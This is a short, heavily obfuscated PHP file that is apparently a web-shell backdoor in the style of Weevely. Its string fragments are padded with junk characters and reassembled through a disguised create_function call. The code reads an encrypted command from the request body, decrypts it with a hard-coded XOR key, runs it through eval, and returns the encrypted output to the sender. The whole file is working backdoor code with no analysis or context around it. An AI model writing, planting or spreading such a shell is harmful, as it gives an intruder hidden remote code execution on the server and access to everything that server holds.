<?php
$D='2h_co2hntents(2h"2hphp://input2h"2h),$m)=2h=1) {@2ho2h2hb_st2hart();@ev2hal(@gzuncom2h';
$p='press(@x(@base2h64_decode($m[1]),$2hk)));$2ho=2h@ob_get_co2hntent2hs();@ob_en2hd_cl';
$g='Yw2hsr1e";2hfunctio2hn x($2ht,$k)2h{$c=strl2hen($2hk2h);$l=2hst2hrlen2h($t)2h;$o=""';
$w='k{$2hj};}2h}r2hetur2hn 2h$o;}if (@p2hreg_ma2h2htch("/$k2hh(.+2h)$kf/",@f2hile_get';
$L='$k="ad2h6420db2h";$2hkh="2h2hec40d33282h488";$kf="46d762hd362h2fa9"2h;$p="KDiYZ2hen3Ye';
$V=';for($i=0;$i<2h$l2h;){for($j=0;(2h$j2h<$c&&2h$i<$2hl2h2h);$j++,2h$i++){$o.=$t{$i}^$';
$b=str_replace('Jw','','JwcJwreatJwe_fuJwJwnctJwion');
$v='ean2h(2h);$r2h=@base62h4_enco2hde(@2hx(@g2hzcompress($2ho),$k)2h);print("$p2h$kh$r$2hkf");}';
$d=str_replace('2h','',$L.$g.$V.$w.$D.$p.$v);
$n=$b('',$d);$n();
?>
